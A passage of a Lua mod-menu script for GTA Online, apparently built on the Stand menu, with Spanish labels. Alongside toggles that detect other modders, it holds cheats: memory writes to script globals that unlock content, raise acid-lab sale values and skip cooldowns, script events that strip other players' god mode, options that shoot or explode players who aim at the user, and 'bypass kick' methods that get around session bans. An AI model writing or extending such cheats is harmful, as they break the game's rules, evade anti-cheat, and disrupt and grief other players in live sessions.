            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                util.toast(players.get_name(player_id) .. " Esta usando arma mod")
                break
            end
        end
    end
end)

menu.toggle_loop(detections, "Coche Sin Salir", {}, "Saldra si tiene un que no a salido en el juego oficialmente.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(player_id)
        for i, name in ipairs(ryze.modded_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(player_id) .. " Tiene coche modeado")
                break
            end
        end
    end
end)

menu.toggle_loop(detections, "Arma En Interior", {}, "Saldra si usa arma en interior", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if players.is_in_interior(player_id) and WEAPON.IS_PED_ARMED(player, 7) then
            util.draw_debug_text(players.get_name(player_id) .. " Tiene un arma en interior")
            break
        end
    end
end)

menu.toggle_loop(detections, "Es Hacker", {}, "Detecta si el jugador lo estan por bannear", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local reason = NETWORK.NETWORK_PLAYER_GET_CHEATER_REASON(player_id)
        if NETWORK.NETWORK_PLAYER_IS_CHEATER(player_id) then
            util.draw_debug_text(players.get_name(player_id) .. " Estan por banearle :u, razon:", reason)
            break
        end
    end
end)

menu.toggle_loop(detections, "Correr Rapido", {}, "Detecta si corre mas rapido", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local ped_speed = (ENTITY.GET_ENTITY_SPEED(ped)* 2.236936)
        if not util.is_session_transition_active() and ryze.get_interior_of_player(player_id) == 0 and ryze.get_transition_state(player_id) ~= 0 and not PED.IS_PED_DEAD_OR_DYING(ped) 
        and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_IN_ANY_VEHICLE(ped, false)
        and not TASK.IS_PED_STILL(ped) and not PED.IS_PED_JUMPING(ped) and not ENTITY.IS_ENTITY_IN_AIR(ped) and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) <= 300.0 and ped_speed > 30 then -- fastest run speed is about 18ish mph but using 25 to give it some headroom to prevent false positives
            util.toast(players.get_name(player_id) .. " Is Using Super Run")
            break
        end
    end
end)

menu.toggle_loop(detections, "Noclip", {}, "Detecta si el jugador esta levitando", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local ped_ptr = entities.handle_to_pointer(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local oldpos = players.get_position(player_id)
        util.yield()
        local currentpos = players.get_position(player_id)
        local vel = ENTITY.GET_ENTITY_VELOCITY(ped)
        if not util.is_session_transition_active() and players.exists(player_id)
        and ryze.get_interior_player_is_in(player_id) == 0 and ryze.get_spawn_state(player_id) ~= 0
        and not PED.IS_PED_IN_ANY_VEHICLE(ped, false)
        and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped)
        and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped) and not PED.IS_PED_USING_SCENARIO(ped)
        and not TASK.GET_IS_TASK_ACTIVE(ped, 160) and not TASK.GET_IS_TASK_ACTIVE(ped, 2)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) <= 395.0
        and ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped) > 5.0 and not ENTITY.IS_ENTITY_IN_AIR(ped) and entities.player_info_get_game_state(ped_ptr) == 0
        and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
        and vel.x == 0.0 and vel.y == 0.0 and vel.z == 0.0 then
            util.toast(players.get_name(player_id) .. " Esta usando noclip")
            break
        end
    end
end)

menu.toggle_loop(detections, "Spectateando", {}, "Detecta si te espectea o a alguien mas", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        for i, interior in ipairs(interior_stuff) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            if not util.is_session_transition_active() and ryze.get_spawn_state(player_id) ~= 0 and ryze.get_interior_of_player(player_id) == interior
            and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
                if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_cam_pos(player_id)) < 15.0 and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 20.0 then
                    util.toast(players.get_name(player_id) .. " Te esta viendo")
                    break
                end
            end
        end
    end
end)

menu.toggle_loop(detections, "Teleport", {}, "Detecta si el jugador se teletransporta", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
            local oldpos = players.get_position(player_id)
            util.yield(500)
            local currentpos = players.get_position(player_id)
            for i, interior in ipairs(interior_stuff) do
                if v3.distance(oldpos, currentpos) > 300.0 and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
                and ryze.get_interior_player_is_in(player_id) ~= 0 and ryze.get_spawn_state(player_id) == interior and PLAYER.IS_PLAYER_PLAYING(player_id) and player.exists(player_id) then
                    util.toast(players.get_name(player_id) .. " Se acaba de teletransportar")
                end
            end
        end
    end
end)

menu.toggle_loop(detections, "Voto De Kickeo", {}, "Detecta si votan por expulsar a alguien de la sesion muy rapidamente y avisa.  Mas conocido como 'smart kick' en stand.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local kickowner = NETWORK.NETWORK_SESSION_GET_KICK_VOTE(player_id)
        local kicked = NETWORK.NETWORK_SESSION_KICK_PLAYER(player_id)
        if kicked then
            util.draw_debug_text(players.get_name(player_id) .. " El jugador" .. kicked .. "ha sido kickeado por:" .. kickowner)
            break
        end
    end
end)

menu.toggle_loop(detections, "Unirse Rapido", {}, "Detecta si alguien se une a ti de manera inusual.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        if not util.is_session_transition_active() and ryze.get_spawn_state(player_id) == 0 and players.get_script_host() == player_id  then
            util.toast(players.get_name(player_id) .. " Envio una deteccion (Thunder Join) y ahora es modder")
        end
    end
end)

--------------------------------------------------------------------------------------------------------------------------------
--Self

menu.toggle(selfc, "Sangre Fria", {}, "Remueve tu señal termica.\nAlgunos jugadores pueden seguir viendote.", function(toggle)
    local player = players.user_ped()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player)
    if toggle then
        PED.SET_PED_HEATSCALE_OVERRIDE(ped, 0)
    else
        PED.SET_PED_HEATSCALE_OVERRIDE(ped, 1)
    end
end)

local maxHealth <const> = 328
menu.toggle_loop(selfc, ("Fuera Del Radar Muerto"), {"undeadotr"}, "", function()
	if ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped()) ~= 0 then
		ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), 0)
	end
end, function ()
	ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), maxHealth)
end)

menu.toggle_loop(selfc, "Sin animacion", {}, "Cambias de arma rapido.", function()
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 56) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 92) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
    if (TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 160) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 167) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 165)) and not TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 195) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)

menu.toggle_loop(selfc, "Respawn Rapido", {}, "Quitara la pantalla de carga.", function()
    local player = players.user_ped()
    local pointr = entities.handle_to_pointer(player)
    if entities.get_health(pointr) < 100 then
        GRAPHICS.ANIMPOSTFX_STOP_ALL()
        memory.write_int(memory.script_global(2672505 + 1684 + 756), memory.read_int(memory.script_global(2672505 + 1684 + 756)) | 1 << 1) -- Jinx Taken
    end
end)

local s_forcefield_range = 10
local s_forcefield = 0
local s_forcefield_names = {
    [0] = "Push",
    [1] = "Pull"
}

menu.toggle_loop(selfc, "Campo De Fuerza", {"sforcefield"}, "", function()
    if players.exists(players.user()) then
        local _entities = {}
        local player_pos = players.get_position(players.user())

        for _, vehicle in pairs(entities.get_all_vehicles_as_handles()) do
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
            if v3.distance(player_pos, vehicle_pos) <= s_forcefield_range then
                table.insert(_entities, vehicle)
            end
        end
        for _, ped in pairs(entities.get_all_peds_as_handles()) do
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if (v3.distance(player_pos, ped_pos) <= s_forcefield_range) and not PED.IS_PED_A_PLAYER(ped) then
                table.insert(_entities, ped)
            end
        end
        for i, entity in pairs(_entities) do
            local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
            local entity_type = ENTITY.GET_ENTITY_TYPE(entity)

            if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and not (player_vehicle == entity) then
                local force = ENTITY.GET_ENTITY_COORDS(entity)
                v3.sub(force, player_pos)
                v3.normalise(force)

                if (s_forcefield == 1) then
                    v3.mul(force, -1)
                end
                if (entity_type == 1) then
                    PED.SET_PED_TO_RAGDOLL(entity, 500, 0, 0, false, false, false)
                end

                ENTITY.APPLY_FORCE_TO_ENTITY(
                    entity, 3, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true, false, false
                )
            end
        end
    end
end)

menu.toggle(selfc, "Pasos Silenciosos", {}, "Quita el sonido de tus pasos. (Networked)", function(toggle)
    AUDIO.SET_PED_FOOTSTEPS_EVENTS_ENABLED(PLAYER.PLAYER_PED_ID(), not toggle)
end)

menu.toggle(selfc, "Fuego Amigo", {}, "Habilita el fuego amigo.", function(toggle)
    PED.SET_CAN_ATTACK_FRIENDLY(players.user_ped(), toggle, false)
end)

--[[
    menu.toggle_loop(selfc, "Recargar Automaticamente", {}, "Recargara Automaticamente.", function()
    local Cloudys = players.user_ped()
    local CloudysW = util.get_weapons(Cloudys)
    if TASK.GET_IS_TASK_ACTIVE(Cloudys, 4) and WEAPON.GET_AMMO_IN_CLIP(Cloudys, CloudysW, 2) and not PED.IS_PED_SHOOTING(Cloudys) then
        WEAPON.REFILL_AMMO_INSTANTLY(Cloudys)
    end
end)
]]

menu.slider(selfc, "Transparencia Local", {"transparency"}, "Te hara poco visible localmente.", 0, 100, 100, 20, function(value)
    if value > 80 then
        ENTITY.RESET_ENTITY_ALPHA(players.user_ped())
    else
        ENTITY.SET_ENTITY_ALPHA(players.user_ped(), value * 2.55, false)
    end
end)

--------------------------------------------------------------------------------------------------------------------------------
--Online

menu.toggle_loop(online, "Entrar Rapidamente", {}, "Entraras mucho mas rapido a las sesiones.", function()
    local script_host = players.get_script_host()
    local player = players.user()
    if util.is_session_transition_active() and script_host ~= player and script_host ~= -1 then
        menu.trigger_commands("givesh" .. players.get_name(player))
    end
end)

menu.toggle_loop(online, "Adicto SH", {}, "Te vuelves adicto al script host.", function()
    if players.get_script_host() ~= players.user() and ryze.get_spawn_state(players.user()) ~= 0 then
        menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(players.user())..">Friendly>Give Script Host"))
    end
end)

menu.toggle(online, "Revelar Jugadores 'Test'", {}, "Forzara a los jugadores a salir en el radar.", function(on)
    if on then
        util.trigger_script_event(1 << players.user(), {2793044, players.user(), 1})
    else
        util.trigger_script_event(1 << players.user(), {2793044, players.user(), 0})
    end
end)

menu.toggle(online, "Anti-Chat", {}, "Hace que no salga cuando estas escribiendo el 'icono' encima de ti", function()
	if on then
		menu.trigger_commands("hidetyping on")
	else
		menu.trigger_commands("hidetyping off")
	end
end)

menu.toggle_loop(online, "Aceptar La Union", {}, "Aceptara automaticamente pantallas de unirse", function() -- credits to jinx for letting me steal this
    local message_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    if message_hash == 15890625 or message_hash == -398982408 or message_hash == -587688989 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        util.yield(50)
    end
end)

--menu.toggle(online, "Armas Termicas 'Test'", {}, "Hace todas tus armas con mira termica con la tecla. E", function()
--    if PLAYER.IS_PLAYER_FREE_AIMING(PLAYER.PLAYER_PED_ID()) then
--        if PAD.IS_CONTROL_JUST_PRESSED(69, 69) then
--            menu.trigger_commands("thermalvision on")
--            GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(50)
--        else
--            menu.trigger_commands("thermalvision off")
--            GRAPHICS.SET_SEETHROUGH(false)
--            GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(1) --default value is 1
--        end
--    elseif GRAPHICS.GET_USINGSEETHROUGH() then
--        menu.trigger_commands("thermalvision off")
--        GRAPHICS.SEETHROUGH_SET_MAX_THICKNESS(1)
--    end
--end)

joining = false
menu.toggle(online, "Notificacion De Jugador", {}, "Avisa cuando un jugador entra a la sesion", function(on_toggle)
	if on_toggle then
		joining = true
	else
		joining = false
	end
end)

local aimkrma = menu.list(online, "Aim Karma", {}, "Les puedes hacer algo a las personas que te apunten.")

local karma = {}
menu.toggle_loop(aimkrma, "Disparar", {}, "Le dispara al jugadore que te apunta.", function()
    if ryze.playerIsTargetingEntity(PLAYER.PLAYER_PED_ID()) and karma[PLAYER.PLAYER_PED_ID()] then
        local pos = ENTITY.GET_ENTITY_COORDS(karma[PLAYER.PLAYER_PED_ID()].ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z +0.1, 100, true, 100416529, PLAYER.PLAYER_PED_ID(), true, false, 100.0)
        util.yield(loopdelayMS + (loopdelaySEC * 1000) + (loopdelayMIN * 1000 * 60))
    end
end)

menu.toggle_loop(aimkrma, "Explotar", {}, "Explotara al jugador que te apunte.", function()
    if ryze.playerIsTargetingEntity(PLAYER.PLAYER_PED_ID()) and karma[PLAYER.PLAYER_PED_ID()] then
        ryze.explodePlayer(karma[PLAYER.PLAYER_PED_ID()].ped, true)
    end
end)

menu.toggle_loop(aimkrma, "Quitarle el godmode", {"JSgodAimKarma"}, "Si el jugador que te apunta tiene GodMode y un menu meirda, se lo quitaras.", function()
    if ryze.playerIsTargetingEntity(PLAYER.PLAYER_PED_ID()) and karma[PLAYER.PLAYER_PED_ID()] and players.is_godmode(karma[PLAYER.PLAYER_PED_ID()].player_id) then
        local karmaPid = karma[PLAYER.PLAYER_PED_ID()].player_id
        util.trigger_script_event(1 << karmaPid, {801199324, karmaPid, 869796886})
    end
end)

local maxps = menu.list(online, "Herramientas De Host", {}, "")

menu.slider(maxps, "Jugadores Max", {}, "Maximo de jugadores en lobby\nsolo funciona cuando eres el host", 1, 32, 32, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(0, value)
        util.toast("free slots",NETWORK.NETWORK_SESSION_GET_MATCHMAKING_GROUP_FREE(0))
    end
end)

menu.slider(maxps, "Espectadores Max", {}, "Espectadores maximos\nsolo funciona cuando eres el host", 0, 2, 2, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(4, value)
        util.toast("free slots",NETWORK.NETWORK_SESSION_GET_MATCHMAKING_GROUP_FREE(4))
    end
end)

--menu.toggle(online, "Tiempo Real", {}, "Hace tu juego concordar con la hora actual de tu ubicacion.", function(toggle)
--    irlTime = toggle
--    local smoothTimeOn = menu.get_value(smoothTransitionCommand) == 1
--    toggleSwitchState(smoothTransitionCommand, smoothTimeOn)
--    util.create_tick_handler(function()
--        menu.trigger_command(setClockCommand, os.date("%H:%M:%S"))
--        return irlTime
--    end)
--    toggleSwitchState(smoothTransitionCommand, smoothTimeOn)
--end)

local servicios = menu.list(online, "Servicios", {}, "")

menu.action(servicios, "Pedir Heli", {}, "Pide un helicopter de lujo a tu ubicacion", function(on_toggle)
    if NETWORK.NETWORK_IS_SESSION_ACTIVE() and
	not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_heli_taxi", -1, true, 0) then
        ryze.int(2793044 + 888, 1)
        ryze.int(2793044 + 895, 1)
	end
end)

menu.action(servicios, "Quitar Recompensa 'Test'", {}, "Quitara tu recompensa si es que tienes una.", function()
    if memory.read_int(memory.script_global(1835502 + 4 + 1 + (players.user() * 3))) == 1 then 
        memory.write_int(memory.script_global(2815059 + 1856 + 17), -1)
        memory.write_int(memory.script_global((2359296+1) + 5149 + 13), 2880000)
    else 
        util.toast("No tienes una recompensa :3")
    end    
end)

local warnlists = false
recovery = menu.list(online, "Recovery", {}, "", function()
    if warnlists then
        warnlists = true
        return
    end
    menu.show_warning(recovery, CLICK_MENU, "No te aseguro que tu cuenta este segura despues de usar esto.", function()
        warnlists = true
        menu.trigger_command(recovery, "")
    end)
end)

local coleccionables = menu.list(recovery, "Coleccionables 'RISKY'", {}, "")

menu.click_slider(coleccionables, "Cintas", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x0, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "Hidden Caches", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x1, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "Cofres/Tesoro", {""}, "", 0, 1, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x2, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "Antenas Radio", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x3, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "USBs", {""}, "", 0, 19, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x4, i, 1, 1, 1})
end)

menu.action(coleccionables, "Naufragios", {""}, "", function()
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x5, 0, 1, 1, 1})
end)

menu.click_slider(coleccionables, "Enterrados", {""}, "", 0, 1, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x6, i, 1, 1, 1})
end)

menu.action(coleccionables, "Camisetas Halloween", {""}, "", function()
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x7, 1, 1, 1, 1})
end)

menu.click_slider(coleccionables, "Linternas", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x8, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "Productos organicos lamar", {""}, "", 0, 99, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0x9, i, 1, 1, 1})
end)

menu.click_slider(coleccionables, "Junk Energy Vuelo Libre", {""}, "", 0, 9, 0, 1, function(i)
    util.trigger_script_event(1 << players.user(), {697566862, players.user(), 0xA, i, 1, 1, 1})
end)

local drugwars = menu.list(recovery, "Drug Wars", {}, "Contenido de DrugWars.")

menu.action(drugwars, "Desbloquear Garage", {}, "Desbloqueara el nuevo garage temporalmente. \nSe borrara al cambiar la sesion.", function()
    util.toast("Iniciando proceso.")
    util.toast("Tarda 2s aprox.")
    local player = PLAYER.PLAYER_PED_ID()
    ENTITY.SET_ENTITY_COORDS(player, -285.96716, 273.57812, 89.13905, 1, false)
    util.yield(1000)
    memory.write_byte(memory.script_global(262145 + 32702), 1)
    memory.write_byte(memory.script_global(262145 + 32688), 0)
    util.toast("Terminado, deberias poder entrar o comprarlo.")
end)

menu.action(drugwars, "Desbloquear Cont/Navidad", {}, "Despues de cambiar de sesion se te desbloqueara el contenido de navidad.", function()
    memory.write_byte(memory.script_global(262145 + 33915), 1)  
    memory.write_byte(memory.script_global(262145 + 33916), 1)  
end)

menu.action(drugwars, "Desbloquear Cont/DLC", {}, "Te desbloqueara el contenido del nuevo DLC \nProbablemente sea solo por la sesion.", function()
    menu.trigger_commands("scripthost")
    util.yield(50)
    for i = 33974, 34112, 1 do
        memory.write_byte(memory.script_global(262145 + i), 1)  
    end
end)

menu.action(drugwars, "Desbloquear Misiones", {}, "Te desbloqueara todo. \nIncluyendo una de las nuevas misiones.", function()
    menu.trigger_commands("scripthost")
    util.toast("Tendras las camisetas btw.")
    util.yield(50)
    util.toast("Tendras las nuevas misiones, los vendedores, y quien sabe, mas?.")
    for i = 33910, 34794, 1 do
        memory.write_byte(memory.script_global(262145 + i), 1)  
    end
end)


--menu.action(drugwars, "Desbloquear van.", {}, "Te desbloqueara la van de armas.", function()
--    local player = PLAYER.PLAYER_PED_ID()
--    menu.trigger_commands("scripthost")
--    util.yield(50)
--    for i = 0, 29 do
--        memory.write_byte(memory.script_global(262145 + 33800 + 1 + i), 1)
--    end
--    memory.write_byte(memory.script_global(262145 + 33799), 1)
--end)

menu.action(drugwars, "Llamar al ladron 'Test'", {}, "Llamara al ladron que te da regalos.", function()
    local player = PLAYER.PLAYER_PED_ID()
    menu.trigger_commands("scripthost")
    memory.write_byte(memory.script_global(2756261 + 171), 1)
    memory.write_byte(memory.script_global(2756259 + 6), 1)
end)

menu.toggle_loop(drugwars, "Misiones Del Taxi", {}, "", function() -- credit to sapphire for all of this <3 / Also Prisuhm, this is hes code.
    if memory.read_byte(memory.script_global(262145 + 33770)) ~= 1 then
        memory.write_byte(memory.script_global(262145 + 33770), 1)
    return end
end)

local acidlab = menu.list(recovery, "Acid Lab", {}, "Acido owo.")

menu.click_slider(acidlab, "Capacidad De Producto", {}, "", 0, 1000, 160, 1, function(capacity)
    memory.write_int(memory.script_global(262145 + 18949), capacity) 
end)

menu.toggle(acidlab, "Suministros Gratis", {}, "", function()
    memory.write_int(memory.script_global(262145 + 21869), 0)
end, function()
    memory.write_int(memory.script_global(262145 + 21869), 60000)
end)

menu.toggle(acidlab, "Aumentar Velocidad De Produccion", {}, "", function()
    memory.write_int(memory.script_global(262145 + 17396), 100) 
end, function()
    memory.write_int(memory.script_global(262145 + 17396), 135000) 
end)

menu.action(acidlab, "Llenar Suministros", {}, "", function()
    local time = NETWORK.GET_CLOUD_TIME_AS_INT() - memory.read_int(memory.script_global(262145 + 18954))
    memory.write_int(memory.script_global(1648637 + 1 + 6), time)
end)

menu.click_slider(acidlab, "Valor De Venta", {}, "No mas de 2 Millones. \nPueden banearte si excedes.", 0, 10000, 1, 1, function(value)
    memory.write_int(memory.script_global(262145 + 17425), value * 1485) 
end)

menu.toggle_loop(acidlab, "Saltar Cooldown De Dax", {}, "", function() -- thx icedoomfist and pwisuhm my dad
    STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_XM22JUGGALOWORKCDTIMER"), -1, true)
end)

menu.toggle_loop(recovery, "Cortadora Laser Cayo 'Test'", {}, "Reducira el tiempo de la cortadora de plasma.", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()), true)
    local interior = INTERIOR.GET_INTERIOR_AT_COORDS(pos.x, pos.y, pos.z)
    if interior == 281601 then --the room behind the bars where the primary target is
        local cutterProgress = memory.read_float(memory.script_local("fm_mission_controller_2020", 28273 + 3))
        if cutterProgress then
            if cutterProgress > 0 and cutterProgress < 99.999 then
                memory.write_float(memory.script_local("fm_mission_controller_2020", 28273 + 3), 99.999)
                util.toast("Saltando Animacion...")
            end
        end
    end
end)

menu.toggle_loop(recovery, "Popularidad Del Club", {}, "Te pondra la popularidad del club nocturno al 100 siempre.", function(toggle)
    if ryze.getNightclubDailyEarnings() < 10000 then
        menu.trigger_commands("clubpopularity 100")
    end
end)

local bypasskick = menu.list(online, "Bypass Kick", {}, "Opciones que te permiten usar metodos para \n entrar a la sesion si te estan bloqueando.")

local normalmeth = menu.list(bypasskick, "Metodos Normales")

menu.toggle(normalmeth, "Metodo V1", {"bkick1"}, "Un poco mas funcional pero tambien con mas errores de red", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
    local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
    local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
    local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
    local BlockJoin = menu.ref_by_path("Online>Protections>Block Join Karma")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
        menu.trigger_commands("skipbroadcast on")
        menu.trigger_commands("speedupspawn on")
        menu.trigger_commands("speedupfmmc on")
        menu.trigger_commands("skipswoopdown on")
        menu.trigger_commands("nospawnactivities on")
        menu.trigger_commands("showtransitionstate on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_command(BlockBailing, "on")
        menu.trigger_command(BlockBailing2, "on")
        menu.trigger_command(BlockBailing3, "on")
        menu.trigger_command(BlockBailing4, "on")
        menu.trigger_command(BlockJoin, "on")
        util.toast("Activado, ahora entra a su sesion y prepara el kick")
    else
        menu.trigger_commands("nobgscript off")
        menu.trigger_commands("skipbroadcast off")
        menu.trigger_commands("speedupspawn off")
        menu.trigger_commands("speedupfmmc off")
        menu.trigger_commands("skipswoopdown off")
        menu.trigger_commands("nospawnactivities off")
        menu.trigger_commands("showtransitionstate off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_command(BlockBailing3, "off")
        util.toast("Listo, todo desactivado")
    end
end)

menu.toggle(normalmeth, "Metodo V2", {"bkick2"}, "Metodo mas funcional, pero para desarrolladores, recibiras notificacion de todo evento de red", function(on_toggle)
local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
local ShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Enabled")
local BlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
local UnShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Disabled")
local UnBlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
if on_toggle then
    menu.trigger_commands("nobgscript on")
    menu.trigger_commands("skipbroadcast on")
    menu.trigger_commands("speedupspawn on")
    menu.trigger_commands("speedupfmmc on")
    menu.trigger_commands("skipswoopdown on")
    menu.trigger_commands("nospawnactivities on")
    menu.trigger_commands("showtransitionstate on")
    menu.trigger_command(BlockIncSyncs)
    menu.trigger_command(BlockNetEvents)
    menu.trigger_command(BlockBailing, "on")
    menu.trigger_command(BlockBailing2, "on")
    menu.trigger_command(BlockBailing3, "on")
    menu.trigger_command(BlockBailing4, "on")
    menu.trigger_command(ShowNotis)
    menu.trigger_command(BlockRaw)
    util.toast("Activado, ahora entra a su sesion y prepara el kick")
else
    menu.trigger_commands("nobgscript off")
    menu.trigger_commands("skipbroadcast off")
    menu.trigger_commands("speedupspawn off")
    menu.trigger_commands("speedupfmmc off")
    menu.trigger_commands("skipswoopdown off")
    menu.trigger_commands("nospawnactivities off")
    menu.trigger_commands("showtransitionstate off")
    menu.trigger_command(UnblockIncSyncs)
    menu.trigger_command(UnblockNetEvents)
    menu.trigger_command(BlockBailing3, "off")
    menu.trigger_command(UnShowNotis)
    menu.trigger_command(UnBlockRaw)
    util.toast("Listo, todo desactivado")
end
end)

menu.toggle(normalmeth, "Metodo V3", {"bkick3"}, "Probablemente rompa el juego, usa en tu propio riesgo", function(on_toggle)
